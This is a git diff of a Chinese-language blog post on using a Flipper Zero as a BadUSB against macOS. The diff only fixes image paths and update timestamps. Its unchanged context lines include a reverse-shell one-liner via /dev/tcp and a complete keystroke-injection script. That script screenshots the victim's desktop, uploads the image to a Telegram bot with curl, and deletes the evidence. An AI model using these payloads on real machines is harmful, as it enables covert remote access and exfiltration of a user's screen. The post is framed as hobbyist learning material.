@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://kazma.tw/images/hellofrombadUSB.png">
 <meta property="og:image" content="https://kazma.tw/images/badscreenshot.png">
 <meta property="article:published_time" content="2024-10-02T15:55:25.532Z">
-<meta property="article:modified_time" content="2025-08-20T03:38:34.156Z">
+<meta property="article:modified_time" content="2025-08-20T03:52:02.402Z">
 <meta property="article:author" content="kazma">
 <meta property="article:tag" content="flipper-zero">
 <meta property="article:tag" content="iThome">
@@ -586,8 +586,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-08-20 11:38:34</span>
-            <span class="mobile">2025-08-20 11:38:34</span>
+            <span class="desktop">2025-08-20 11:52:02</span>
+            <span class="mobile">2025-08-20 11:52:02</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -642,7 +642,7 @@
 <p>我們的腳本是針對 mac 的用戶，我們透過 Spotlight 先打開 terminal 然後進到 bash，之後輸入 <code>bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1</code>，就會看到駭客的監聽畫面有變化了，如下：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/reverseDemo.png"
+                     data-src="/images/reverseDemo.png"
                       alt="demo"
                 ></p>
 <p>成功！</p>
@@ -651,14 +651,14 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/hellofrombadUSB.png"
+                     data-src="/images/hellofrombadUSB.png"
                       alt="hello"
                 ><br>成功！<br>接著我們嘗試從受害者的電腦截圖後傳給我們的機器人然後刪除我們的截圖假裝什麼都沒發生，腳本如下，記得換成你們的 token 跟 id：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">REM Open Spotlight and type Terminal</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">STRING Terminal</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Get the username and take a screenshot</span><br><span class="line">STRING username=$(whoami) &amp;&amp; screencapture /Users/$username/Desktop/screenshot.png</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Send the screenshot to the Telegram bot</span><br><span class="line">STRING curl -s -X POST -F &quot;chat_id=&lt;chat_id&gt;&quot; -F &quot;photo=@\&quot;/Users/$username/Desktop/screenshot.png\&quot;&quot; https://api.telegram.org/bot&lt;token&gt;/sendPhoto</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Clean up by removing the screenshot and closing Terminal</span><br><span class="line">STRING rm /Users/$username/Desktop/screenshot.png</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line">STRING exit</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure></div>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/badscreenshot.png"
+                     data-src="/images/badscreenshot.png"
                       alt="badscreen"
                 ><br>成功！！！</p>
 <h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>今天的內容也是我剛剛花一個半小時邊嘗試邊撰寫的結果，還好有順利成功，歡迎大家跟我分享有什麼有趣的 BadUSB 應用，我們可以一起來玩玩，但呼籲各位是透過 Flipper 來學習，不要真的去做壞駭客。<br>各位明天見，敬請期待！</p>
@@ -676,7 +676,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-08-20 11:38:34
+                    :</strong> 2025-08-20 11:52:02
             </li>
         
         <li>
